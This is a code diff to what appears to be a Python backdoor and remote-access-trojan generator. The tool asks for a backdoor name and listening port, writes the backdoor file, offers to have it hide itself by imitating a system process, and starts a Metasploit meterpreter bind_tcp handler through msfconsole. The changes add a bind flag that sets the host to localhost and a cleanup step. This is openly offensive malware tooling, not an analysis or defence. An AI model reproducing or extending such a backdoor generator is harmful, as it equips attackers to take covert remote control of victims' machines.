@@ -110,8 +110,10 @@ def listen(host, port):
 def gen_bind():
     global name
     global port
+    global bind
     name = input('Please enter the name you wish to give your backdoor (do NOT add extention such as .py or .exe): ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
+    bind = '1'
     with open(name, 'a+') as ina:
         ina.write('port = '+str(port))
         a = '''
@@ -386,6 +388,8 @@ def rep_syst():
     hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (y/n): ')
     if hide == 'y':
         global name2
+        if bind == '1':
+            host='localhost'
         name2=input('Please enter the name for the rat: ')
         with open(name2, 'a+') as hider:
             hider.write(str('host = "'+host+'"\n'))
@@ -549,6 +553,7 @@ if nscan == "1":
     gen_bind()
     postgen()
     rep_syst()
+    cleanup()
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
 if nscan == "2":
